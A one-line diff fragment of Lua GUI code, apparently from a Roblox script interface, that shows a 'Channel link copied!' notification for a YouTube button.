+    WindUI:Notify({ Title="YouTube", Content="Channel link copied!", Icon="check-circle", Duration=3 }) end })
